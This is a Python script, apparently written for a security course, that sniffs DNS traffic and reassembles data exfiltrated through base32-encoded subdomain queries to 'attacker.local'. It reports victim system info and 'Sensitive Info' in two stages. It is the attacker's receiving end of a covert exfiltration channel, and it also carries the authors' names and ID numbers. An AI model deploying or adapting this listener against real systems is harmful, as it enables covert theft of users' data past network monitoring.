#dns_decoder.py
# Meir Shuker 318901527 Noa Agassi 209280635

from scapy.all import sniff
from scapy.layers.dns import DNSQR

ATTACK_DOMAIN = "attacker.local"
finished_flag = False

stage1_chunks = []
stage2_chunks = []
seen_stage1_seq = set()
seen_stage2_seq = set()

import base64

def b32_decode(blob: str) -> str:
    pad = "=" * (-len(blob) % 8)
    return base64.b32decode((blob + pad).upper()).decode()

def process_packet(packet):
    global finished_flag
    if packet.haslayer(DNSQR):
        qname = packet[DNSQR].qname.decode()

        # ---------- FINISH ----------
        if qname.lower().startswith("finish.") and qname.lower().endswith(f".{ATTACK_DOMAIN}."):
            finished_flag = True
            return

        if ATTACK_DOMAIN in qname:
            chunk = clean_chunk(qname)
            # extract prefix, idx, data
            if chunk.startswith("STAGE1_") or chunk.startswith("STAGE2_"):
                prefix, idx, data = chunk.split("_", 2)
                idx = int(idx)
                try:
                    data_decoded = b32_decode(data)
                except Exception:
                    return
                if prefix == "STAGE1":
                    if idx not in seen_stage1_seq:
                        seen_stage1_seq.add(idx)
                        stage1_chunks.append((idx, data_decoded))
                else:
                    if idx not in seen_stage2_seq:
                        seen_stage2_seq.add(idx)
                        stage2_chunks.append((idx, data_decoded))

def print_summary():
    print("\n" + "=" * 60)
    print("[✓] Exfiltration Complete. Reconstructed Data:\n")

    # ---------- Stage 1 ----------
    print("[Stage 1: Basic System Info]")
    print("-" * 40)
    seqs1 = sorted(idx for idx, _ in stage1_chunks)
    missing1 = [i for i in range(seqs1[0], seqs1[-1] + 1)] if seqs1 else []
    missing1 = [i for i in missing1 if i not in seqs1]
    if not missing1:
        print("✅  All Stage-1 chunks received.\n")
    else:
        print("MISSING CHUNKS:", missing1)

    stage1_full = "".join(data for _, data in sorted(stage1_chunks))
    print(format_stage1(stage1_full))


    # ---------- Stage 2 ----------
    print("\n[Stage 2: Sensitive Info]")
    print("-" * 40)
    seqs2 = sorted(idx for idx, _ in stage2_chunks)
    missing2 = [i for i in range(seqs2[0], seqs2[-1] + 1)] if seqs2 else []
    missing2 = [i for i in missing2 if i not in seqs2]
    if not missing2:
        print("✅  All Stage-2 chunks received.\n")
    else:
        print("MISSING CHUNKS:", missing2)

    stage2_full = "".join(data for _, data in sorted(stage2_chunks))
    for line in stage2_full.splitlines():
        print(line)

    print("=" * 60)

def clean_chunk(raw_chunk):
    return raw_chunk.strip(".").replace(f".{ATTACK_DOMAIN}", "").replace(f".{ATTACK_DOMAIN}.", "")

def should_stop(_):
    return finished_flag

import re

STAGE1_RE = re.compile(
    r"user-(?P<user>[^.]+)\."
    r"ip-(?P<ip>[^.]+)\."
    r"lang-(?P<lang>[^.]+)\."
    r"os-(?P<os>.+)$"
)

def format_stage1(raw: str) -> str:
    """
    Pretty-print the Stage-1 line:
    user-<name>.ip-<digits>.lang-<locale>.os-<string>
    """
    m = STAGE1_RE.match(raw)
    if not m:
        return raw

    ip_raw = m.group("ip")
    if ip_raw.isdigit() and len(ip_raw) == 11:
        ip = f"{ip_raw[:3]}.{ip_raw[3:6]}.{ip_raw[6:8]}.{ip_raw[8:]}"
    else:
        ip = ip_raw

    lang = m.group("lang").replace(" ", "_")

    items = {
        "user": m.group("user"),
        "ip":   ip,
        "lang": lang,
        "os":   m.group("os").replace("_", " "),
    }
    width = max(len(k) for k in items)
    return "\n".join(f"• {k.ljust(width)} : {v}" for k, v in items.items())



if __name__ == "__main__":
    print("Listening for DNS exfiltration...\n(The program stop when data finished)\n")
    sniff(filter="udp port 53", prn=process_packet,stop_filter=should_stop, store=0)

    print_summary()